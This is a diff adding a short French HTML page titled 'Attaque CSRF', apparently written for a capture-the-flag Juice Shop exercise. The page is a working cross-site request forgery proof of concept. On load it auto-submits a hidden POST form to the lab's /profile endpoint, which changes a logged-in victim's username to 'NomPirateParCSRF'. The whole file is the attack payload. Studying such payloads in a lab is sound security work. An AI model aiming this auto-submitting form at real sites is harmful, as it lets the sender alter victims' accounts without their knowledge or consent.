@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attaque CSRF</title>
+</head>
+<body onload="document.getElementById('csrfForm').submit()">
+    <h2>Le navigateur est en train d'être détourné...</h2>
+
+    <form action="https://ctf.juice.cyber.epitest.eu/profile" method="POST" id="csrfForm">
+        <input type="hidden" name="username" value="NomPirateParCSRF" />
+    </form>
+
+    <p>Si la victime est connectée au site cible, son nom d'utilisateur va changer.</p>
+</body>
+</html>
